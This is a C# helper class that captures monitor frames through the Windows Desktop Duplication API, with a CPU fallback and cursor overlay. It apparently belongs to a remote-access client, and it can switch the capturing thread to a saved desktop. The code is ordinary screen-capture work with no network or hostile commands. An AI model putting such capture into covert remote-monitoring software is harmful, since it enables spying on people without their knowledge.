using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using Rectangle = System.Drawing.Rectangle;
using Pulsar.Client.Config;
using Pulsar.Client.Helper.ScreenStuff.DesktopDuplication;

namespace Pulsar.Client.Helper
{    
    public static class ScreenHelperGPU
    {
        private static readonly object _lockObject = new object();
        private static Dictionary<int, DesktopDuplicator> _duplicators = new Dictionary<int, DesktopDuplicator>();
        private static bool _initialized = false;

        private const int CURSOR_SHOWING = 0x00000001;

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO
        {
            public int cbSize;
            public int flags;
            public IntPtr hCursor;
            public POINT ScreenPosition;
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        /// <summary>
        /// Initializes the GPU-based screen capture system using Desktop Duplication API.
        /// </summary>
        private static void Initialize()
        {
            try
            {
                CleanupResources();
                _duplicators = new Dictionary<int, DesktopDuplicator>();
                _initialized = true;
                Debug.WriteLine("GPU Screen Helper initialized successfully with Desktop Duplication API");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to initialize GPU Screen Helper: {ex.Message}");
                CleanupResources();
                throw;
            }
        }        
        
        /// <summary>
        /// Disposes and cleans up DirectX resources
        /// </summary>
        public static void CleanupResources()
        {
            lock (_lockObject)
            {
                if (_duplicators != null)
                {
                    foreach (var duplicator in _duplicators.Values)
                    {
                        duplicator?.Dispose();
                    }
                    _duplicators.Clear();
                }

                _initialized = false;
            }
        }
        
        /// <summary>
        /// Gets or creates a desktop duplicator for the specified monitor.
        /// </summary>
        private static DesktopDuplicator GetDuplicator(int screenNumber)
        {
            if (!_duplicators.ContainsKey(screenNumber))
            {
                try
                {
                    _duplicators[screenNumber] = new DesktopDuplicator(screenNumber);
                    Debug.WriteLine($"GPU Desktop Duplication API initialized for screen {screenNumber}");
                }
                catch (DesktopDuplicationException ex)
                {
                    Debug.WriteLine($"Failed to create duplicator for screen {screenNumber}: {ex.Message}");
                    throw;
                }
            }
            return _duplicators[screenNumber];
        }
        
        /// <summary>
        /// Try to get a raw GPU frame for zero-copy encoding. Returns false if no new frame.
        /// Caller must Dispose the returned mappedFrame when done.
        /// </summary>
        public static bool TryCaptureRawFrame(int screenNumber, out DesktopDuplicator.MappedFrame mappedFrame)
        {
            mappedFrame = null;
            lock (_lockObject)
            {
                if (!_initialized)
                {
                    Initialize();
                }

                var monitorCount = DisplayManager.GetDisplayCount();
                if (screenNumber < 0 || screenNumber >= monitorCount)
                    throw new ArgumentOutOfRangeException(nameof(screenNumber));

                Rectangle bounds = GetBounds(screenNumber);
                if (bounds.Height > bounds.Width)
                    return false;

                var duplicator = GetDuplicator(screenNumber);
                return duplicator.TryGetLatestMappedFrame(out mappedFrame);
            }
        }

        /// <summary>
        /// Captures the screen using GPU acceleration with Desktop Duplication API
        /// </summary>
        /// <param name="screenNumber">The index of the screen to capture</param>
        /// <param name="setThreadPointer">Whether to set the thread desktop pointer</param>
        /// <returns>A bitmap containing the captured screen, or null if no new GPU frame is available.</returns>
        public static Bitmap CaptureScreen(int screenNumber, bool setThreadPointer = false)
        {
            if (setThreadPointer)
            {
                SetThreadDesktop(Settings.OriginalDesktopPointer);
            }

            lock (_lockObject)
            {
                try
                {
                    if (!_initialized)
                    {
                        Initialize();
                    }

                    var monitorCount = DisplayManager.GetDisplayCount();
                    if (screenNumber < 0 || screenNumber >= monitorCount)
                    {
                        throw new ArgumentOutOfRangeException(nameof(screenNumber));
                    }

                    Rectangle bounds = GetBounds(screenNumber);

                    if (bounds.Height > bounds.Width)
                    {
                        Debug.WriteLine($"Screen {screenNumber} is in portrait mode, falling back to CPU capture");
                        return ScreenHelperCPU.CaptureScreen(screenNumber, false);
                    }

       
                    DesktopDuplicator duplicator;
                    try
                    {
                        duplicator = GetDuplicator(screenNumber);
                    }
                    catch (DesktopDuplicationException ex)
                    {
                        Debug.WriteLine($"Failed to get duplicator for screen {screenNumber}: {ex.Message}");
                        return ScreenHelperCPU.CaptureScreen(screenNumber, false);
                    }

                    // Get the latest frame
                    DesktopFrame frame = null;
                    try
                    {
                        frame = duplicator.GetLatestFrame();
                    }
                    catch (DesktopDuplicationException ex)
                    {
                        Debug.WriteLine($"Failed to get frame from duplicator: {ex.Message}");
                        if (_duplicators.ContainsKey(screenNumber))
                        {
                            _duplicators[screenNumber]?.Dispose();
                            _duplicators.Remove(screenNumber);
                        }
                        return ScreenHelperCPU.CaptureScreen(screenNumber, false);
                    }

                    if (frame == null || frame.DesktopImage == null)
                    {
                        Debug.WriteLine($"GPU capture: No new frame available for screen {screenNumber}");
                        return null;
                    }

                    Bitmap resultBitmap = frame.DesktopImage;
                    Debug.WriteLine($"GPU Desktop Duplication API successfully captured frame: {resultBitmap.Width}x{resultBitmap.Height} for screen {screenNumber}");

                    // Draw cursor
                    try
                    {
                        using (Graphics g = Graphics.FromImage(resultBitmap))
                        {
                            IntPtr hdc = g.GetHdc();
                            try
                            {
                                DrawCursor(hdc, bounds);
                            }
                            finally
                            {
                                g.ReleaseHdc(hdc);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to draw cursor: {ex.Message}");
                    }

                    return resultBitmap;
                }
                catch (DesktopDuplicationException ex)
                {
                    Debug.WriteLine($"Desktop duplication error: {ex.Message}, falling back to CPU capture");
                    return ScreenHelperCPU.CaptureScreen(screenNumber, false);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error capturing screen with GPU: {ex.Message}");
                    CleanupResources();
                    return ScreenHelperCPU.CaptureScreen(screenNumber, false);
                }
            }
        }

        private static void DrawCursor(IntPtr destDeviceContext, Rectangle bounds)
        {
            var cursorInfo = new CURSORINFO { cbSize = Marshal.SizeOf(typeof(CURSORINFO)) };
            if (GetCursorInfo(out cursorInfo) && cursorInfo.flags == CURSOR_SHOWING)
            {
                DrawIcon(destDeviceContext, cursorInfo.ScreenPosition.X - bounds.X, cursorInfo.ScreenPosition.Y - bounds.Y, cursorInfo.hCursor);
            }
        }        
        
        /// <summary>
        /// Gets the bounds of the specified screen
        /// </summary>
        public static Rectangle GetBounds(int screenNumber)
        {
            var rects = DisplayManager.GetAllMonitorRects();
            if (screenNumber < 0 || screenNumber >= rects.Count)
                throw new ArgumentOutOfRangeException(nameof(screenNumber));
            var r = rects[screenNumber];
            return new Rectangle(r.left, r.top, r.right - r.left, r.bottom - r.top);
        }        
        
        /// <summary>
        /// Cleans up all cached resources to free memory
        /// </summary>
        public static void CleanupCache()
        {
            CleanupResources();
        }
    }
}